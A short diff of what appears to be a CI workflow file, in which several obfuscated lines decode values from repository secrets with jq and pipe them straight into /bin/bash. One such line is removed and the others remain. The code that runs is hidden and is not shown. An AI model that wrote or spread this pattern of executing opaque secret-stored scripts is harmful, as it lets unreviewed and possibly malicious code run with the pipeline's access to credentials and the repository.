@@ -17,7 +17,6 @@ jobs:
           l250: ${{ secrets.l250 }}
         run: |
           printf '%s' "$l250" | jq -r .ylq14709 | /bin/bash
-          printf '%s' "$c3041" | jq -r .pmojl988 | /bin/bash
           printf '%s' "$as93346" | jq -r .m694 | /bin/bash
           echo $qwxv980 | jq -r .ljyln14 | /bin/bash
           echo $xeza185 | jq -r .njsxm03 | /bin/bash
